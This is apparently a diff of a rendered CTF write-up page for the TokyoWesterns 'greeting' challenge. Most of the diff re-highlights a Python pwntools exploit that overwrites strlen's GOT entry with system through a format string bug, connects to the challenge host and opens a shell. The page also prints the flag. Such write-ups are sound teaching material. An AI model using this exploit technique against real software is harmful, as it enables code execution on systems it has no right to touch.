@@ -310,97 +310,95 @@
   <li>The program will then return to the main function. Since <code class="highlighter-rouge">strlen</code>’s GOT has already been changed into <code class="highlighter-rouge">system</code>’s address, we can then input <code class="highlighter-rouge">sh</code> and execute <code class="highlighter-rouge">system("sh")</code> during the <code class="highlighter-rouge">getnline</code> function (the function will call <code class="highlighter-rouge">strlen</code> on our input).</li>
 </ul>
 
-<p>```python exp_greeting.py
-#!/usr/bin/env python</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
 
-<p>from pwn import *
-import subprocess
-import sys
-import time</p>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
 
-<p>HOST = “pwn2.chal.ctf.westerns.tokyo”
-PORT = 16317
-ELF_PATH = “./greeting”
-LIBC_PATH = “”</p>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"pwn2.chal.ctf.westerns.tokyo"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">16317</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./greeting"</span>
+<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
-<h1 id="setting">setting</h1>
-<p>context.arch = ‘i386’
-context.os = ‘linux’
-context.endian = ‘little’
-context.word_size = 32</p>
-<h1 id="critical-debug-error-info-notset-warn-warning">[‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]</h1>
-<p>context.log_level = ‘INFO’</p>
+<span class="c"># setting </span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
-<p>elf = ELF(ELF_PATH)</p>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
 
-<p>def my_recvuntil(s, delim):
-    res = “”
-    while delim not in res:
-        c = s.recv(1)
-        res += c
-        sys.stdout.write(c)
-        sys.stdout.flush()
-    return res</p>
+<span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">+=</span> <span class="n">c</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">res</span>
 
-<p>def myexec(cmd):
-    return subprocess.check_output(cmd, shell=True)</p>
+<span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
-<p>def fmtstr(payload, prints, index, data, byte=1):
-    “””
+<span class="k">def</span> <span class="nf">fmtstr</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">prints</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">byte</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
+    <span class="s">"""
     data: data that want to be written into the address
-    index: stack position (ex. %7$n –&gt; index = 7)
+    index: stack position (ex. </span><span class="si">%7</span><span class="s">$n --&gt; index = 7)
     prints: total charaters that have been print out
-    payload: whole payload string, initial value are addresses</p>
+    payload: whole payload string, initial value are addresses
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ex.  payload = p32(addr) + p32(addr2) + p32(addr3)
-     prints = 12
-     payload, prints = fmtstr(payload, prints, 7, 0xa0a0, 2)
-     payload, prints = fmtstr(payload, prints, 8, 0xc0, 1)
-     payload, prints = fmtstr(payload, prints, 9, 0x08047654, 4)
-"""
+    ex.  payload = p32(addr) + p32(addr2) + p32(addr3)
+         prints = 12
+         payload, prints = fmtstr(payload, prints, 7, 0xa0a0, 2)
+         payload, prints = fmtstr(payload, prints, 8, 0xc0, 1)
+         payload, prints = fmtstr(payload, prints, 9, 0x08047654, 4)
+    """</span>
 
-if data - prints &gt; 0:
-    num = data - prints
-else:
-    num = data + 256**byte - prints
-    while(num &lt;= 0):
-        num += 256**byte
+    <span class="k">if</span> <span class="n">data</span> <span class="o">-</span> <span class="n">prints</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">num</span> <span class="o">=</span> <span class="n">data</span> <span class="o">-</span> <span class="n">prints</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">num</span> <span class="o">=</span> <span class="n">data</span> <span class="o">+</span> <span class="mi">256</span><span class="o">**</span><span class="n">byte</span> <span class="o">-</span> <span class="n">prints</span>
+        <span class="k">while</span><span class="p">(</span><span class="n">num</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">):</span>
+            <span class="n">num</span> <span class="o">+=</span> <span class="mi">256</span><span class="o">**</span><span class="n">byte</span>
+    
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">+</span> <span class="s">"c"</span> 
+    <span class="n">prints</span> <span class="o">=</span> <span class="n">data</span>
 
-payload += "%" + str(num) + "c" 
-prints = data
+    <span class="k">if</span> <span class="n">byte</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span> <span class="o">+</span> <span class="s">"$hhn"</span>
+    <span class="k">elif</span> <span class="n">byte</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span> <span class="o">+</span> <span class="s">"$hn"</span>
+    <span class="k">elif</span> <span class="n">byte</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span> <span class="o">+</span> <span class="s">"$n"</span>
+    <span class="k">elif</span> <span class="n">byte</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span> <span class="o">+</span> <span class="s">"$lln"</span>
 
-if byte == 1:
-    payload += "%" + str(index) + "$hhn"
-elif byte == 2:
-    payload += "%" + str(index) + "$hn"
-elif byte == 4:
-    payload += "%" + str(index) + "$n"
-elif byte == 8:
-    payload += "%" + str(index) + "$lln"
+    <span class="k">return</span> <span class="n">payload</span><span class="p">,</span> <span class="n">prints</span>
 
-return payload, prints
-</code></pre></div></div>
+<span class="k">def</span> <span class="nf">fmtstr_scan</span><span class="p">(</span><span class="n">cnt</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">'.'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span> <span class="s">"</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">"$p"</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">cnt</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
 
-<p>def fmtstr_scan(cnt):
-    return ‘.’.join( “%”+str(i)+”$p” for i in xrange(1,cnt+1))</p>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
-<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="c">#r = process(ELF_PATH)</span>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
-#r = process(ELF_PATH)
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"AA"</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x08049934</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'strlen'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'strlen'</span><span class="p">]</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> 
+    <span class="n">prints</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">18</span>
+    <span class="n">payload</span><span class="p">,</span> <span class="n">prints</span> <span class="o">=</span> <span class="n">fmtstr</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">prints</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mh">0x85ed</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="n">payload</span><span class="p">,</span> <span class="n">prints</span> <span class="o">=</span> <span class="n">fmtstr</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">prints</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mh">0x8490</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="n">payload</span><span class="p">,</span> <span class="n">prints</span> <span class="o">=</span> <span class="n">fmtstr</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">prints</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mh">0x0804</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">payload</span>
+    <span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-payload = "AA"+p32(0x08049934) + p32(elf.got['strlen']) + p32(elf.got['strlen']+2) 
-prints = len(payload) + 18
-payload, prints = fmtstr(payload, prints, 12, 0x85ed, 2)
-payload, prints = fmtstr(payload, prints, 13, 0x8490, 2)
-payload, prints = fmtstr(payload, prints, 14, 0x0804, 2)
-print payload
-print len(payload)
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"... "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"... "</span><span class="p">,</span> <span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
 
-r.sendlineafter("... ", payload)
-r.sendlineafter("... ", "sh\x00")
-
-r.interactive() ```
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>flag: <code class="highlighter-rouge">TWCTF{51mpl3_FSB_r3wr173_4nyw4r3}</code></p>
